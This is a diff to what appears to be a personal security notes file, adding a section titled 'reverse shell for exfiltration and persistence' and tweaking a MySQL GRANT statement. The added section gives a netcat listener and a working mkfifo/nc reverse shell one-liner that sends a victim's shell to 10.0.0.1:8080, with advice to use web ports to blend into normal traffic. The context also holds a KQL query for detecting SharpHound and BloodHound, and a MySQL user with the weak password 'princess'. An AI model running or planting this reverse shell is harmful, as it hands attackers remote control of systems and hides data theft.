@@ -584,6 +584,30 @@ Expected results are :
 > KQL = message: (SharpHound or BloodHound)  More to come...
 
 
+
+
+<!---
+*******************************************************************************
+-->
+Reference : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd
+
+# REVERSE SHELL FOR EXFILTRATION AND PERSISTENCE
+| Always try to use a web port to hide ine the usual traffic
+
+## On the attacker system
+| The first step is to start a listener on the attacker box, so the victim will connect (reverse = from the victim to the attacker outside your network)
+```
+nc -nlvp 8080
+```
+
+## On the victim system
+| The second step is to connect to the attacker and give acces to the victim shell
+```
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 8080 >/tmp/f
+```
+
+
+
 <!---
 *******************************************************************************
 -->
@@ -735,7 +759,7 @@ sudo mysql -u root
 
 # Create a new user
 CREATE USER 'mysqladmin'@'localhost' IDENTIFIED BY 'princess';
-GRANT ALL ON *.* TO 'mysqladmin'@'localhost';
+GRANT ALL PRIVILEGES ON *.* TO 'mysqladmin'@'localhost';
 
 #mysql> CREATE USER 'root'@'192.168.6.130' IDENTIFIED BY 'princess';
 #mysql> GRANT ALL PRIVILEGES ON database_name.* TO 'root'@'192.168.6.130';
